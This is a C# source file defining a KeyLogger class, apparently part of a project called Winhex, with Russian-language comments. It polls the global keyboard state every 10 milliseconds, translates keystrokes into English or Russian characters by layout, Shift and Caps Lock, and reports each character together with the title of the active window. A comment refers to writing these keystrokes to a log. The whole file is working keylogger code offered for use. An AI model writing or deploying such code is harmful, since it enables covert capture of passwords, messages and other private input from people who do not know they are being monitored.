using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;

namespace Winhex.Models
{
    class KeyLogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private char[] alphabet_eng = new char[] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
        private char[] alphabet_ENG = new char[] { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
        private char[] alphabet_rus = new char[] { 'ф', 'и', 'с', 'в', 'у', 'а', 'п', 'р', 'ш', 'о', 'л', 'д', 'ь', 'т', 'щ', 'з', 'й', 'к', 'ы', 'е', 'г', 'м', 'ц', 'ч', 'н', 'я' };
        private char[] alphabet_RUS = new char[] { 'Ф', 'И', 'С', 'В', 'У', 'А', 'П', 'Р', 'Ш', 'О', 'Л', 'Д', 'Ь', 'Т', 'Щ', 'З', 'Й', 'К', 'Ы', 'Е', 'Г', 'М', 'Ц', 'Ч', 'Н', 'Я' };
        private char[] nums           = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
        private char[] specSymbolsEng = new char[] { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
        private char[] specSymbolsRus = new char[] { ')', '!', '"', '№', ';', '%', ':', '?', '*', '(' };

        private int[] specialCases = new int[] { 191, 188, 190, 186, 222, 219, 221, 220, 111, 189, 109, 187, 107, 8, 106, 110, 32 };

        /// <summary>
        /// Событие, возвращающее заголовок окна активного приложения и введенный символ
        /// </summary>
        public event Action<string, char> OnKeyPressed;

        public KeyLogger()
        {
            Timer mainTimer = new Timer(10);
            mainTimer.Elapsed += MainTimer_Elapsed;
            mainTimer.Start();
        }

        /// <summary>
        /// Проверка статуса клавиши
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
            var keyboard = GetKeyboard();
            bool shift = ShiftIsDown();
            string title = GetActiveWindowTitle() == null ? "" : GetActiveWindowTitle();

          
            // nums
            for (int i = 48; i <= 57; i++)
            {
                if (IsKeyPushedDown(i))
                {
                    if (shift)
                        if (keyboard == Keyboard.RUS || keyboard == Keyboard.rus)
                            OnKeyPressed?.Invoke(title, specSymbolsRus[i - 48]);
                        else
                            OnKeyPressed?.Invoke(title, specSymbolsEng[i - 48]);
                    else OnKeyPressed?.Invoke(title, nums[i - 48]);
                }
            }
            for (int i = 96; i <= 105; i++)
            {
                if (IsKeyPushedDown(i))
                    OnKeyPressed?.Invoke(title, nums[i - 96]);
            }

            // symbols
            for (int i = 65; i <= 90; i++)
            {
                if (IsKeyPushedDown(i))
                {
                    if (shift)
                    {
                        if (keyboard == Keyboard.RUS)
                            OnKeyPressed?.Invoke(title, alphabet_rus[i - 65]);
                        if (keyboard == Keyboard.rus)
                            OnKeyPressed?.Invoke(title, alphabet_RUS[i - 65]);
                        if (keyboard == Keyboard.ENG)
                            OnKeyPressed?.Invoke(title, alphabet_eng[i - 65]);
                        if (keyboard == Keyboard.eng)
                            OnKeyPressed?.Invoke(title, alphabet_ENG[i - 65]);
                    }
                    else
                    {
                        if (keyboard == Keyboard.RUS)
                            OnKeyPressed?.Invoke(title, alphabet_RUS[i - 65]);
                        if (keyboard == Keyboard.rus)
                            OnKeyPressed?.Invoke(title, alphabet_rus[i - 65]);
                        if (keyboard == Keyboard.ENG)
                            OnKeyPressed?.Invoke(title, alphabet_ENG[i - 65]);
                        if (keyboard == Keyboard.eng)
                            OnKeyPressed?.Invoke(title, alphabet_eng[i - 65]);
                    }
                }
            }

            // special cases
            for (int i = 0; i < specialCases.Length; i++)
            {
                if (IsKeyPushedDown(specialCases[i]))
                {
                    char sym = '1';
                    switch (specialCases[i])
                    {
                        case 191:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS || keyboard == Keyboard.rus)
                                    sym = ',';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '?';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS || keyboard == Keyboard.rus)
                                    sym = '.';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '/';
                            }
                            break;
                        case 188:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'б';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Б';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '<';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Б';
                                if (keyboard == Keyboard.rus)
                                    sym = 'б';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = ',';
                            }
                            break;
                        case 190:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'ю';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Ю';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '>';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Ю';
                                if (keyboard == Keyboard.rus)
                                    sym = 'ю';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '.';
                            }
                            break;
                        case 186:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'ж';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Ж';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = ':';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Ж';
                                if (keyboard == Keyboard.rus)
                                    sym = 'ж';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = ';';
                            }
                            break;
                        case 222:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'э';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Э';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '\"';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Э';
                                if (keyboard == Keyboard.rus)
                                    sym = 'э';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '\'';
                            }
                            break;
                        case 219:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'х';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Х';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '{';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Х';
                                if (keyboard == Keyboard.rus)
                                    sym = 'х';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '[';
                            }
                            break;
                        case 221:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'ъ';
                                if (keyboard == Keyboard.rus)
                                    sym = 'Ъ';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '}';
                            }
                            else
                            {
                                if (keyboard == Keyboard.RUS)
                                    sym = 'Ъ';
                                if (keyboard == Keyboard.rus)
                                    sym = 'ъ';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = ']';
                            }
                            break;
                        case 220:
                            if (shift)
                            {
                                if (keyboard == Keyboard.RUS || keyboard == Keyboard.rus)
                                    sym = '/';
                                if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                    sym = '|';
                            }
                            else
                            {
                                sym = '\\';
                            }
                            break;
                        case 111:
                            sym = '/';
                            break;
                        case 189:
                            if (shift) sym = '_';
                            else sym = '-';
                            break;
                        case 109:
                            sym = '-';
                            break;
                        case 187:
                            if (shift) sym = '+';
                            else sym = '=';
                            break;
                        case 107:
                            sym = '+';
                            break;
                        // особый случай для Backspace. Не забыть проанализировать при записи в лог
                        case 8:
                            sym = '`';
                            break;
                        case 106:
                            sym = '*';
                            break;
                        case 110:
                            if (keyboard == Keyboard.RUS || keyboard == Keyboard.rus)
                                sym = ',';
                            if (keyboard == Keyboard.ENG || keyboard == Keyboard.eng)
                                sym = '.';
                            break;
                        case 32:
                            sym = ' ';
                            break;
                        //default:

                    }
                    if (sym != '1')
                        OnKeyPressed?.Invoke(title, sym);
                }
            }
        }
       
        /// <summary>
        /// Проверка на нажатость клавиши
        /// </summary>
        /// <param name="vKey">Код клавиши</param>
        /// <returns></returns>
        private static bool IsKeyPushedDown(int vKey)
        {
            return GetAsyncKeyState(vKey) == -32767;
        }

        /// <summary>
        /// Возвращает текущую раскладку пользователя
        /// </summary>
        /// <returns></returns>
        private Keyboard GetKeyboard()
        {
            if (IsCapsLocked())
            {
                if (GetKeyboardLayout() == 1033)
                    return Keyboard.ENG;
                else
                    return Keyboard.RUS;
            }
            else
            {
                if (GetKeyboardLayout() == 1033)
                    return Keyboard.eng;
                else
                    return Keyboard.rus;
            }
        }

        /// <summary>
        /// Возвращает статус активированности капс лока
        /// </summary>
        /// <returns></returns>
        private bool IsCapsLocked()
        {
             return Console.CapsLock;
        }

        /// <summary>
        /// Проверка на зажатие шифта
        /// </summary>
        /// <returns></returns>
        private bool ShiftIsDown()
        {
            return GetAsyncKeyState(16) == -32768;
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );

        /// <summary>
        /// Вернёт Id раскладки.
        /// </summary>
        private ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }

    

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// Возвращает заголовок активного окна 
        /// </summary>
        /// <returns></returns>
        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
    }
}
